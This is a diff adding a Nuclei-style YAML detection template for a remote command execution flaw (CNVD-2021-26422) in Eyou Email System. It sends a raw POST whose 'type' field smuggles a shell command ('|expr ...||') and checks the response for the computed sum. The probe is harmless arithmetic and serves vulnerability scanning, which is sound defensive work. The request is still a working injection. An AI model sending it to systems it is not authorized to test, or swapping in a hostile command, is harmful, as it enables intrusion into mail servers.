@@ -1,0 +1,27 @@
+id: eyou-email-system-rce
+info:
+  name: Eyou Email System Remote Command Execution (CNVD-2021-26422)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cnvd-2021-26422
+  description: |
+    Eyou Email System is vulnerable to remote command execution due to improper input handling.
+variables:
+  r1: "{{rand_int(100000, 910000)}}"
+  r2: "{{rand_int(100000, 910000)}}"
+http:
+  - raw:
+      - |
+        POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        type='|expr {{r1}} + {{r2}}||'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, to_string(to_number(r1) + to_number(r2)))
